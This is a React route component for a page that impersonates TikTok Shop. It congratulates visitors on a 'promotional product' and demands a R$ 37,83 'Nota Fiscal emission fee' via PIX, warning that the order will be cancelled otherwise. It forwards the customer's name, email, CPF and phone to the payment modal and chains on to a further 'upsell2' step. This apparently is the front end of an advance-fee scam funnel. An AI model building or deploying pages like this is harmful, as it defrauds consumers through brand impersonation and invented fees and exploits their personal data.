import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { goWithTracking } from "@/lib/tracking";
import { markCurrentPixPaid, setNextStep } from "@/components/upsell/funnel";
import PixModal from "@/components/upsell/PixModal";
import { useCustomerData } from "@/components/upsell/useCustomerData";
import { usePixPrefetch } from "@/components/upsell/usePixPrefetch";
import { upsellTokens, shadowCard, PINK } from "@/components/upsell/tokens";

const AMOUNT = 37.83;
const DETAILS = "NF-e Taxa de Emissao";

export const Route = createFileRoute("/upsell1")({
  head: () => ({
    meta: [
      { title: "Emissao de Nota Fiscal | TikTok Shop" },
      {
        name: "description",
        content: "Conclua a emissao da nota fiscal do seu pedido para liberar o envio.",
      },
      { property: "og:title", content: "Emissao de Nota Fiscal | TikTok Shop" },
      {
        property: "og:description",
        content: "Conclua a emissao da nota fiscal do seu pedido para liberar o envio.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: Upsell1,
});

function Upsell1() {
  const [showPixModal, setShowPixModal] = useState(false);
  const { data: customerData, isLoaded: customerLoaded } = useCustomerData();
  const { data: prefetchedPix, loading: prefetchLoading, error: prefetchError } = usePixPrefetch(
    AMOUNT,
    DETAILS,
    { data: customerData, isLoaded: customerLoaded },
    "upsell",
  );

  // Se o PIX desta etapa for confirmado depois (aba fechada, volta mais tarde),
  // a recuperação de funil leva o lead direto para a etapa seguinte.
  useEffect(() => {
    setNextStep("/upsell2");
  }, []);

  const handleSuccess = () => {
    setShowPixModal(false);
    localStorage.setItem("up1PaymentApproved", "true");
    markCurrentPixPaid("/upsell2");
    goWithTracking("/upsell2");
  };

  return (
    <div
      className="min-h-screen bg-background flex items-center justify-center p-4"
      style={upsellTokens}
    >
      <div
        className={`w-full max-w-md bg-card rounded-2xl ${shadowCard} p-8 text-center space-y-6`}
      >
        <img src="/images/ttk-shop-up.png" alt="TikTok Shop" className="h-10 mx-auto" />

        <h1 className="text-2xl font-extrabold text-foreground">Parabens! </h1>

        <p className="text-muted-foreground text-sm leading-relaxed">
          Voce acabou de garantir seu produto promocional atraves da TikTok Shop! Para concluir,
          basta realizar o pagamento da emissao da Nota Fiscal do seu produto.
        </p>

        <div className="bg-secondary/50 rounded-xl p-6 space-y-2">
          <p className="text-sm text-muted-foreground font-medium">
            NF-e (Taxa de Emissao de Nota Fiscal)
          </p>
          <p className="text-3xl font-extrabold text-foreground">
            R$ {AMOUNT.toFixed(2).replace(".", ",")}
          </p>
          <p className="text-xs text-muted-foreground">Taxa unica para emissao da nota fiscal</p>
        </div>

        <button
          onClick={() => setShowPixModal(true)}
          className="w-full font-bold py-4 px-6 rounded-xl text-base shadow-lg text-white transition-transform active:scale-[0.98]"
          style={{ backgroundColor: PINK }}
        >
          EFETUAR PAGAMENTO DA TAXA
        </button>

        <div className="bg-secondary/30 rounded-xl p-4">
          <p className="text-xs text-muted-foreground leading-relaxed">
            Para receber seu produto do TikTok Shop, e necessario pagar a NF-e. Sem o pagamento, o
            envio nao sera autorizado e o pedido sera cancelado.
          </p>
        </div>
      </div>

      <PixModal
        isOpen={showPixModal}
        onClose={() => setShowPixModal(false)}
        amount={AMOUNT}
        title="Taxa de Nota Fiscal"
        customerName={customerData.name}
        customerEmail={customerData.email}
        customerCpf={customerData.cpf}
        customerPhone={customerData.phone}
        details={DETAILS}
        paymentType="upsell"
        onSuccess={handleSuccess}
        prefetchedData={prefetchedPix}
        prefetchLoading={prefetchLoading}
        prefetchError={prefetchError}
      />
    </div>
  );
}
